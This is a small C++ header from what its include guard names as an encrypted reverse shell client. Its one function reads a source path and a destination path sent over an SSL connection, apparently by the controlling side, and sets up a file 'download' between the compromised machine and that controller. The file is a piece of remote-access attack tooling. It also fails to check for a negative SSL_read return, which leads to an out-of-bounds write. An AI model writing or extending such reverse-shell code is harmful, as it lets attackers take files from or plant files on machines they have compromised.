#ifndef ENCRYPTED_REV_SHELL_CLIENT_UTILS_H
#define ENCRYPTED_REV_SHELL_CLIENT_UTILS_H
// client specific functions

inline fileTransfer c_handleDownloadRequest(SSL* ssl) {

    char pathToRead[256];
    char pathToWrite[256];

    int pathToReadBytes = SSL_read(ssl, pathToRead, sizeof(pathToRead) - 1);
    pathToRead[pathToReadBytes] = '\0'; // null byte to prevent non required data being added to the buffer

    int pathToWriteBytes = SSL_read(ssl, pathToWrite, sizeof(pathToWrite) - 1);
    pathToWrite[pathToWriteBytes] = '\0'; // null byte to prevent non required data being added to the buffer

    // set up the config
    fileTransfer transferCfg;
    transferCfg.type = "download";
    transferCfg.pathToWrite = std::string(pathToWrite);
    transferCfg.pathToRead = std::string(pathToRead);

    return transferCfg;
}





#endif //ENCRYPTED_REV_SHELL_CLIENT_UTILS_H